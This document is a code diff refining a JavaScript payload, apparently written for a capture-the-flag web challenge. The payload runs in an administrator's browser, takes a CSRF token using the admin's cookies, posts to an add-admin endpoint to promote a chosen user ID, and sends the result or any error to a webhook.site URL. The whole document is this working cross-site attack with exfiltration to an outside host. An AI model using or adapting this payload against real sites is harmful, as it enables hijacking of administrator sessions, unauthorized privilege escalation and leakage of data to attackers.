@@ -1,15 +1,34 @@
 <script>
 (async () => {
   try {
-    // build base URL without credentials
-    const base = location.protocol + '//' + location.hostname + (location.port ? ':' + location.port : '');
+    const FALLBACK = 'https://web1-79e4a3bc.p1.securinets.tn';
+    const WEBHOOK = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160';
+    const TARGET_USER_ID = 278;
 
-    // fetch CSRF token using admin's cookies
+    // build base without credentials
+    const base = (typeof location !== 'undefined' && location.hostname)
+      ? (location.protocol + '//' + location.hostname + (location.port ? ':' + location.port : ''))
+      : FALLBACK;
+
+    // fetch csrf token
     const tokRes = await fetch(base + '/csrf-token', { credentials: 'include' });
-    const tokJson = await tokRes.json();
-    const csrf = tokJson.csrf || tokJson.token || tokJson._csrf || tokJson.CSRF; // tolerant parsing
+    let tokJson;
+    try {
+      tokJson = await tokRes.clone().json();
+    } catch (e) {
+      // if not JSON, try text parsing fallback (not shown here for brevity)
+      const txt = await tokRes.text();
+      // simple fallback: try to extract token from common patterns
+      const m1 = txt.match(/"csrfToken"\s*:\s*"([^"]+)"/) || txt.match(/name=["']csrf-token["'][^>]+content=["']([^"']+)["']/i);
+      if (m1) tokJson = { csrfToken: m1[1] };
+      else tokJson = {};
+    }
 
-    // POST to promote userId 278
+    // Use csrfToken field first, then other common names
+    const csrf = tokJson.csrfToken || tokJson.csrf || tokJson._csrf || tokJson.CSRF || tokJson.csrfTokenId || tokJson.token || tokJson.tokenId;
+    if (!csrf) throw new Error('no-csrf-found');
+
+    // perform the privileged POST to promote
     const promoteRes = await fetch(base + '/admin/addAdmin', {
       method: 'POST',
       credentials: 'include',
@@ -17,14 +36,14 @@
         'Content-Type': 'application/json',
         'CSRF-Token': csrf
       },
-      body: JSON.stringify({ userId: 278 })
+      body: JSON.stringify({ userId: TARGET_USER_ID })
     });
 
     const promoteText = await promoteRes.text();
-    // exfiltrate the response to your webhook
-    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?res=' + encodeURIComponent(promoteText);
-  } catch (e) {
-    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?err=' + encodeURIComponent(e.message);
+    // exfiltrate response
+    new Image().src = WEBHOOK + '?res=' + encodeURIComponent(promoteText);
+  } catch (err) {
+    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?err=' + encodeURIComponent(err.message);
   }
 })();
 </script>
